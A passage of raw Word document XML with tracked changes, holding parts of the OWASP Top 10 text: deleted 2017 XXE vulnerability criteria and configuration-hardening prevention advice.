          <w:ins w:id="1879" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Without a concerted, repeatable application security configuration</w:t>
      </w:r>
      <w:del w:id="1880" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7DA053BD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>process, systems are at a higher risk.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2047939E"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81" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74F6E1F2" w14:textId="77777777" w:rsidR="003E073E" w:rsidRPr="003E073E" w:rsidRDefault="003E073E" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="1882" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1883" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A4:2017 XML External Entities (XXE)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3E47010B"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84" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1885" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>## Is the Application Vulnerable?</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="44FFCDD9"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86" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2488E948"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87" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1888" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>Applications and in particular XML-based web services or downstream integrations might be vulnerable to attack if:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="336A34C4"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89" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C77133B"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90" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1891" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* The application accepts XML directly or XML uploads, especially from untrusted sources, or inserts untrusted data into XML documents, which is then parsed by an XML processor.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4F29719C"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92" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1893" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve">* Any of the XML processors in the application or SOAP based web services has [document type definitions (DTDs)](https://en.wikipedia.org/wiki/Document_type_definition) enabled. As the exact mechanism for disabling DTD processing varies by processor, it is good practice to consult a reference such as the [OWASP Cheat Sheet 'XXE Prevention'](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet). </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="03F849D6"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94" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1895" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* If the application uses SAML for identity processing within federated security or single sign on (SSO) purposes. SAML uses XML for identity assertions, and may be vulnerable.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="67355A40"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96" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1897" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* If the application uses SOAP prior to version 1.2, it is likely susceptible to XXE attacks if XML entities are being passed to the SOAP framework.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="04D43C58" w14:textId="77777777" w:rsidR="003E073E" w:rsidRPr="003E073E"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98" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1899" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* Being vulnerable to XXE attacks likely means that the application is vulnerable to denial of service attacks including the Billion Laughs attack</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5D1BAF71"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00" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AB97A3E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08934450" w14:textId="0A267A17" w:rsidR="00B74248" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">## How </w:t>
      </w:r>
      <w:del w:id="1901" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>To</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1902" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>to</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B075DA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50A5D5EE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Secure installation processes should be implemented, including:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050CEBF9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BC56122" w14:textId="3BBEB8D4" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1903" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1904" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1905" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> A repeatable hardening process </w:t>
      </w:r>
      <w:del w:id="1906" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>makes it fast and easy to deploy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2C3F9A" w14:textId="1EC568C6" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1907" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1908" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> another environment that is </w:t>
      </w:r>
      <w:del w:id="1909" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>properly</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1910" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>appropriately</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> locked down. Development,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4290C027" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1911" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1912" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> QA, and production environments should all be configured</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46285D67" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1913" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1914" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> identically, with different credentials used in each environment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15940BF7" w14:textId="16512503" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1915" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1916" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> This process should be automated to minimize the effort required to</w:t>
      </w:r>
      <w:del w:id="1917" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> setup</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6B9BCA82" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1918" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    set up</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> a new secure environment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B4DDE1" w14:textId="42059697" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1919" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1920" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7FB0D5EE" w14:textId="6B6F0907" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1921" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1922" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> A minimal platform without</w:t>
      </w:r>
      <w:del w:id="1923" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1924" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>any unnecessary features, components,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E0BF975" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1925" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1926" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> documentation, and samples. Remove or do not install unused features</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6DC9DA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1927" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and frameworks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE5B3EB" w14:textId="1DBA3A25" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1928" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
